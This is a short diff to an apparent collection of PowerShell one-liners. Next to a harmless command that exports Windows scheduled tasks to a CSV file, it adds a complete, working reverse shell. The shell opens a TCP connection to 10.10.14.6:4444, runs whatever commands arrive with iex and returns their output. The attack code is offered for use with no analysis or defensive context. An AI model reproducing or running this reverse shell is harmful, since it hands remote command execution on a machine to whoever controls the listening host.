@@ -1,3 +1,7 @@
+#launch a reverse shell using native .net in powershelll
+$client = New-Object System.Net.Sockets.TCPClient("10.10.14.6",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+
 #document all tasks in task scheduler
 $outcsv = "c:\temp\taskdef.csv" ; Get-ScheduledTask | ForEach-Object { [pscustomobject]@{ Name = $_.TaskName; Path = $_.TaskPath;LastResult = $(($_ | Get-ScheduledTaskInfo).LastTaskResult);NextRun = $(($_ | Get-ScheduledTaskInfo).NextRunTime);Status = $_.State;Command = $_.Actions.execute;Arguments = $_.Actions.Arguments }} |Export-Csv -Path $outcsv -NoTypeInformation -Force
 
